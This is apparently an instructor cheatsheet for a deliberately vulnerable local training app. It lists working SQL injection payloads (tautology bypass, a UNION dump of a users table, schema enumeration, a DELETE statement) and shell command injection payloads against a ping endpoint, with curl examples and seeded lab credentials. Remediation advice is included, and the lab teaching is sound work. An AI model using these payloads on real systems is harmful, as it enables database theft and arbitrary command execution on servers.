# Galactic Bestiary — Instructor / Student Cheatsheet

**For authorized security education only.** Run this app locally in a VM or isolated lab. Do not deploy to the public internet.

This document describes how the **intentional** flaws in this project can be exercised. Use it to teach impact, detection, and remediation—not to attack systems you do not own.

---

## Lab map

| Surface | UI location | HTTP | Vulnerable code |
|---------|-------------|------|-----------------|
| SQL injection | **Search portal** | `GET /api/search?q=…` | String-built `LIKE` in [`app/api/search/route.ts`](app/api/search/route.ts) |
| Command injection | **Check planet connectivity** (sidebar) | `POST /api/ping` JSON `{ "target": "…" }` | `exec(\`ping -c 4 ${target}\`)` in [`app/api/ping/route.ts`](app/api/ping/route.ts) |
| Safe baseline | Creature grid / chart | `GET /api/creatures` | Parameterized query in [`app/api/creatures/route.ts`](app/api/creatures/route.ts) |

**Database file:** `data/galactic.db` (SQLite)

**Tables:**

- `creatures` — `id`, `name`, `species`, `danger_level`, `home_planet`, `description`
- `users` — `id`, `username`, `password` (MD5 hex), `clearance_level`

---

## 1. SQL injection (`/api/search`)

### How the flaw works

User input `q` is interpolated **inside** the `prepare()` call:

```typescript
db.prepare(`SELECT * FROM creatures WHERE name LIKE '%${q}%'`)
```

There is **no** parameterization and **no** escaping. Anything you type in the search box (or send as `q`) becomes part of the SQL string.

On failure, the API returns `{ "rows": [], "sqlError": "<message>" }`. The UI shows **sqlError** under the search bar—useful for error-based teaching.

### What an attacker can actually do here

| Goal | How (via this bug) |
|------|---------------------|
| Bypass the search filter | Break out of the `LIKE` string and force a always-true `WHERE` clause |
| List every creature | Tautology or `%` wildcard |
| Read the hidden **`users`** table | `UNION SELECT` to pull `username`, `password` (MD5), `clearance_level` |
| Learn schema / DB type | Trigger SQL errors; optional `UNION` against `sqlite_master` |
| Change data (theory) | Stacked `UPDATE`/`DELETE`—usually **blocked** by SQLite + single `prepare()`; still discuss in class |

The search box is only *meant* to find creatures by name. SQLi turns it into a **general query interface** against the whole database file.

### Payload cheat sheet (search box or `?q=`)

| Payload | What it does | What you should see |
|---------|----------------|---------------------|
| `Vorash` | Normal search | 1 creature (Vorash the Hollow) in the grid |
| `%` | `LIKE '%%'` matches every name | All **9** creatures |
| `'` | Unclosed string → syntax error | Red **sqlError** box (e.g. incomplete input / syntax error) |
| `' OR 1=1--` | Closes string, adds `OR 1=1`, comments out the rest | All **9** creatures (same as `%`) |
| `' OR '1'='1'--` | Variant tautology | All **9** creatures |
| `' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--` | Appends rows from **`users`** | **5 extra rows** in the grid: usernames in **name**, MD5 hashes in **species**, clearance in **home_planet** |
| `' UNION SELECT 1, name, type, 4, 5, 6 FROM sqlite_master WHERE type='table'--` | Schema discovery (advanced) | Rows showing `creatures`, `users`, etc. in the result fields |

**Resulting SQL for tautology (conceptually):**

```sql
SELECT * FROM creatures WHERE name LIKE '%' OR 1=1--%'
```

SQLite treats `--` as a comment, so the trailing `%'` never breaks the query.

### Step-by-step: normal use → full database leak

**1. Recon (benign)**

```bash
curl -s "http://localhost:3000/api/search?q=Vorash" | jq '.rows | length'
# → 1

curl -s "http://localhost:3000/api/search?q=%25" | jq '.rows | length'   # %25 = %
# → 9

curl -s "http://localhost:3000/api/search?q=%27" | jq '.sqlError'        # %27 = '
# → non-null error message
```

**2. Bypass filter (paste in Search portal)**

```text
' OR 1=1--
```

**What happens:** The app still looks like a “search,” but the query returns **every creature** regardless of name. Proves input controls SQL logic, not just the search term.

**3. Steal operator accounts (`users` table)**

`creatures` returns **6** columns: `id`, `name`, `species`, `danger_level`, `home_planet`, `description`.  
`UNION SELECT` must supply **6** values.

**Payload (paste in Search portal):**

```text
' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--
```

**How results appear in the UI** (column mapping):

| DB column (`users`) | Shows up in creature card field |
|---------------------|----------------------------------|
| `username` | **name** (e.g. `agent_kane`) |
| `password` (MD5 hex) | **species** (e.g. `9999d3f3a0d39a3d80ca3fe21c455678`) |
| `clearance_level` | **home_planet** (e.g. `Omega-Black`) |
| literal `'leaked'` | **description** |

**curl:**

```bash
curl -s --get "http://localhost:3000/api/search" \
  --data-urlencode "q=' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--" \
  | jq '.rows[] | {name, species, home_planet}'
```

**What students do with the hashes:** Look up plaintext in [§7](#7-seeded-credentials-post-exfiltration) or crack MD5 offline (e.g. `nebula-agent` → `9999d3f3a0d39a3d80ca3fe21c455678`).

**4. Optional: list tables (schema enumeration)**

```text
' UNION SELECT 1, name, type, 4, 5, 6 FROM sqlite_master WHERE type='table'--
```

**What happens:** Result rows expose table names (`creatures`, `users`)—useful to explain how attackers map a unknown app to your DB.

### Stacked queries / destructive payloads

**Do not run in shared labs without permission.** Example discussed in class only:

```text
'; DELETE FROM creatures; --
```

With a single `db.prepare(...).all()` call, SQLite often **rejects** multi-statement input—but production apps using different drivers may not. Teaching point: never trust “read-only” UI labels.

### Remediation talking points

- Use **parameterized queries**: `db.prepare('SELECT * FROM creatures WHERE name LIKE ?').all(\`%${q}%\`)` with bound `q`, or build `%` wildcards in application code only.
- Principle of **least privilege** on DB accounts.
- Never expose raw `sqlError` to end users in production.

---

## 2. Command injection (`/api/ping`)

### How the flaw works

The server runs:

```typescript
exec(`ping -c 4 ${host}`, ...)
```

(`host` comes from JSON `target` via `runRelayPing()`.) `child_process.exec` invokes a shell (`/bin/sh -c …` on Unix). Metacharacters in `target` can chain **arbitrary shell commands**, not just ping.

Output is returned as JSON `{ stdout, stderr, error }` and rendered in **Raw terminal stream** in the sidebar.

**This is command injection (CWE-78), not SSRF.** The app does not `fetch()` a URL; it runs a shell command. Chaining `curl` would be CMDi *enabling* HTTP requests, not classic SSRF from ping alone.

### What an attacker can actually do here

| Goal | Example approach |
|------|------------------|
| Prove arbitrary command execution | `127.0.0.1; whoami` |
| Read files on the server | `127.0.0.1; cat package.json` |
| Map the filesystem | `127.0.0.1; pwd` and `127.0.0.1; ls -la` |
| Exfiltrate env / secrets | `127.0.0.1; env` (if present in process env) |
| Probe localhost | `127.0.0.1; ping -c 1 127.0.0.1` (redundant but shows control) |

In production, the same bug often leads to reverse shells, credential theft, or cloud metadata access (`curl` to `169.254.169.254`)—**only demonstrate safe, read-only commands in class.**

### Payload cheat sheet (Planet connectivity field or JSON `target`)

| Payload (`target`) | What it does | What you should see in **Raw terminal stream** |
|--------------------|----------------|--------------------------------------------------|
| `127.0.0.1` | Legitimate ping | `ping` statistics (packets, round-trip time) |
| `8.8.8.8` | Ping public DNS | Normal ping output to Google DNS |
| `127.0.0.1; whoami` | Ping, then print OS user | Ping output **plus** a line like `mackenzie` or `www-data` |
| `127.0.0.1; id` | Ping, then user/group ids | Ping output plus `uid=... gid=...` |
| `127.0.0.1; pwd` | Print working directory | Path to the Next.js process cwd (project root when running `npm run dev`) |
| `127.0.0.1; ls -la` | List directory | File listing mixed after ping output |
| `127.0.0.1; ls -la data` | List SQLite folder | `galactic.db` and related files |
| `127.0.0.1; cat package.json` | Read app manifest | JSON of `package.json` in the output |
| `127.0.0.1 && whoami` | Run `whoami` only if ping succeeds | Same as semicolon variant when ping works |
| `$(whoami)` | Command substitution | Shell runs `whoami` **instead of** a normal ping target string |

**UI:** paste into **Check planet connectivity** → **Run relay ping**.

### Step-by-step: ping → shell

**1. Baseline (benign)**

```bash
curl -s -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target":"127.0.0.1"}' | jq -r '.stdout'
```

**What happens:** Four ICMP echo replies (macOS/Linux `ping -c 4`). Confirms the feature works before attacking it.

**2. Prove command chaining**

```bash
curl -s -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target":"127.0.0.1; whoami"}' | jq -r '.stdout, .stderr'
```

**What happens:** The shell runs roughly:

```bash
ping -c 4 127.0.0.1; whoami
```

Students see **ping output and their username** in the same box—proof the server executed their command.

**3. Read app data from disk**

```bash
curl -s -X POST http://localhost:3000/api/ping \
  -H "Content-Type: application/json" \
  -d '{"target":"127.0.0.1; cat data/galactic.db | xxd | head -5"}' | jq -r '.stdout'
```

**What happens:** Binary/garbled output or hex dump of the SQLite file—shows the ping “utility” can touch sensitive files. (Use a simpler `ls -la data` for younger groups.)

**4. Discuss impact**

The sidebar was labeled “connectivity check,” but the backend is a **remote shell** with training wheels. In AWS/Lambda hosting this would be catastrophic; locally it demonstrates why `exec` + user input is forbidden.

### Windows labs

Default code uses `ping -c 4` (Linux/macOS). On Windows, change the route to `ping -n 4` or payloads like `127.0.0.1 & dir` may differ. Injection **still** applies whenever input is passed to `exec` with string concatenation.

### Remediation talking points

- Use `execFile` / `spawn` with an **argument array** and a fixed binary: `spawn('ping', ['-c', '4', validatedHost])`.
- **Allowlist** hostnames/IPs (still validate format).
- Never pass user input through a shell; avoid `exec` with interpolated strings.
- Run services as **non-root** with minimal filesystem access.

---

## 3. What is *not* vulnerable here

- **`GET /api/creatures`** — prepared statement, safe listing for the grid/chart.
- **Frontend** — React escaping reduces XSS from reflected search results; focus the lab on **server-side** SQL and OS command issues.
- **Authentication** — there is no login flow; `users` data is reachable via SQLi only.

---

## 4. Suggested lab flow (45–60 min)

1. **Explore** the UI; confirm 9 seeded creatures and quadrant chart.
2. **SQLi** — `%` → all; `' OR 1=1--` → all; discuss `sqlError` on malformed input.
3. **SQLi exfil** — `UNION SELECT` from `users`; crack or look up MD5 from README.
4. **Command injection** — `127.0.0.1; whoami` then `127.0.0.1; ls -la` (or `pwd`).
5. **Debrief** — show fixed one-liners (parameterized SQL, `spawn` without shell).
6. **Reset** — delete `data/galactic.db` and restart `npm run dev` between classes if needed.

---

## 5. Quick reference payloads

### SQLi — Search portal (`?q=`)

| Payload | Outcome |
|---------|---------|
| `%` | All 9 creatures |
| `'` | SQL error in UI |
| `' OR 1=1--` | All 9 creatures (filter bypass) |
| `' UNION SELECT id, username, password, 0, clearance_level, 'leaked' FROM users--` | 5 user rows with MD5 passwords in the grid |

### Command injection — Planet connectivity (`target`)

| Payload | Outcome |
|---------|---------|
| `127.0.0.1` | Normal ping |
| `127.0.0.1; whoami` | Ping + OS username |
| `127.0.0.1; pwd` | Ping + current directory |
| `127.0.0.1; ls -la` | Ping + directory listing |
| `127.0.0.1; cat package.json` | Ping + app `package.json` contents |

---

## 6. Opengrep / SAST

Vulnerable code uses **textbook sinks** (inline template literals):

- SQL: `db.prepare(\`SELECT ... '${q}'\`)` in [`app/api/search/route.ts`](app/api/search/route.ts)
- Shell: `exec(\`ping -c 4 ${host}\`)` in [`app/api/ping/route.ts`](app/api/ping/route.ts)

**Scan results (typical):**

| Command | Lab API findings |
|---------|------------------|
| `npm run scan:security` (`.opengrep/galactic-lab.yaml`) | **3–4** (SQLi + CMDi) |
| `npm run scan:community` (cloned semgrep-rules subset) | **0** (Express/Lambda/mysql sinks) |
| `opengrep scan --config auto app/api/` | **0** (registry rules still miss Next.js + `better-sqlite3`) |

Students should use **custom lab rules** plus manual review; cloned community packs remain a **false-negative** demo.

```bash
npm run scan:security
npm run scan:community
npm run scan:all
```

See [README.md](README.md) § Static analysis.

---

## 7. Seeded credentials (post-exfiltration)

After UNION, students can verify MD5 hashes:

| username | password (plaintext) | MD5 (stored) |
|----------|----------------------|--------------|
| agent_kane | nebula-agent | 9999d3f3a0d39a3d80ca3fe21c455678 |
| dr_vex | void-walker | de4b2dfe7295596b4f6dca84d781418a |
| cmd_tess | stellar-ops | d17e5f43b86e142a4c4ecd80903a9cf7 |
| analyst_rio | deep-core | d2832fa0e6986721e038d8e2dfb4f421 |
| xenon_7 | xenon-clear | 17ea4c9547edb80f4d2b63b686aa991d |

Teaching note: MD5 for passwords is **weak storage**; pair with discussion of bcrypt/Argon2 and salting.
